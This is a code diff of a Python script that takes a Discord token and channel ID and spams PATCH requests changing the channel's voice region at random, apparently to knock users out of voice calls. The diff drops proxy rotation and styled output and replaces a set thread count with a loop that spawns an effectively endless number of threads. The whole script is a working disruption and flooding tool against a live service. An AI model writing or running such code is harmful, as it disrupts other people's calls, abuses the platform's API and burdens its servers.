@@ -7,12 +7,10 @@ from pystyle import Colors, Colorate
 import json
 import time
 
-token = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}+{Fore.LIGHTMAGENTA_EX}] {Fore.RESET}Token: {Fore.RESET}")
-proxies = open("proxies.txt", "r").read().splitlines()
+token = input(f"Token: ")
+ID = int(input(f"ID: "))
 
-ID = int(input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}+{Fore.LIGHTMAGENTA_EX}] {Fore.RESET}ID: {Fore.RESET}"))
 
-Threads = int(input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}+{Fore.LIGHTMAGENTA_EX}] {Fore.RESET}Threads: {Fore.RESET}"))
 
 
 regions = [
@@ -50,25 +48,23 @@ def Nicedayzzz():
     }
 
     group = f"https://discord.com/api/v9/channels/{int(ID)}"
-    now = datetime.now()
-    currently = now.strftime("%H:%M:%S")
     RandomRegion = random.choice(regions)
     payload = {"type": 2, "topic": "", "bitrate": 64000, "user_limit": 0, "nsfw": False, "flags": 0,"rate_limit_per_user": 0, "rtc_region": RandomRegion, "default_reaction_emoji": None}
     try:
-        r = requests.patch(group, json=payload,
-                           headers=headers, proxies={"http": proxies})
+        r = requests.patch(group, json=payload,headers=headers)
         s = [200, 201, 204]
         if r.status_code in s:
-            print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}STATUS{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX} @ {Fore.RESET}{currently}{Fore.LIGHTMAGENTA_EX}]",
-                  Colorate.Horizontal(Colors.purple_to_blue, f">: Downnnn", 1))
+            print(f"down {r.status_code}")
         elif r.status_code == 429:
             b = r.json()
+            print(F"retry_after {b['retry_after']}")
             time.sleep(b['retry_after'])
-            print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}STATUS{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX} @ {Fore.RESET}{currently}{Fore.LIGHTMAGENTA_EX}]",
-                  Colorate.Horizontal(Colors.purple_to_blue, f">: retry_after am sleep", 1))
     except:
         pass
 
 
-for i in range(Threads):
-    threading.Thread(target=exec).start()
+def Nicedayz1():
+    for i in range(10000000000000000000000000):
+        t = threading.Thread(target=Nicedayzzz)
+        t.start()
+Nicedayz1()
